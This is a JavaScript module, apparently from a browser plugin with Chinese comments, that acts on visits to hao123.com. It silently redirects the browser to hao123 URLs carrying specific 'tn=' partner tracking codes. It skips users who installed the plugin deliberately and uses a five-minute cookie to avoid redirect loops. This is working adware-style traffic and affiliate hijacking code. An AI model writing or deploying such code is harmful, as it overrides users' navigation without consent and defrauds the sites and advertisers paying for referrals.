__tk__define(function (require, exports, module) {
  var utils = require('../utils');

  // 自主安装渠道的插件不弹
  if (utils.isManualDId) {
    return;
  }
  var url = utils.href,
    // 当前url是否是已跳转url
    isJumpedUrl = function() {
      // 以下链接不跳转
      var i, iLen,
        // 从2345首页跳转过来的hao123链接不跳转
        blackList = [
          'http://www.hao123.com/?tn=92942967_hao_pg',
          'http://www.hao123.com/?tn=98084262_hao_pg'
        ];

      for (i = 0, iLen = blackList.length; i < iLen; i++) {
        if (url === blackList[i]) {
          return false;
        }
      }
      if (url.match(/^http:\/\/www\.hao123\.com\/\?tn=.*/)) {
        return true;
      }
      return false;
    },
    // url跳转函数
    urlJump = function() {
			if (url.match(/\?tn/)) {
				document.location.href = 'http://www.hao123.com/?tn=92942967_hao_pg';
			} else {
				document.location.href = 'http://www.hao123.com/?tn=98084262_hao_pg';
			}
    };

  // 以下两种情况下允许hao123跳转
  // 1.直接访问hao123主页
  // 2.访问跳转后的链接，并且cookie不存在的情况
  if ((isJumpedUrl() && !utils.cookie.get().haoTK) || url === 'http://www.hao123.com/' || url === "http://www.hao123.com/index.html") {
    // 写入cookie, 通过cookie控制每隔一段时间跳转（防止死循环）
    utils.cookie.set({
      name: 'haoTK',
      value: true,
			min: 5,
      path: '/',
      domain: 'hao123.com'
    });
    // cookie写入失败的场合（例如设置浏览器禁止写入cookie）不跳转链接
    if (utils.cookie.get().haoTK) {
      urlJump();
    }
  }
});
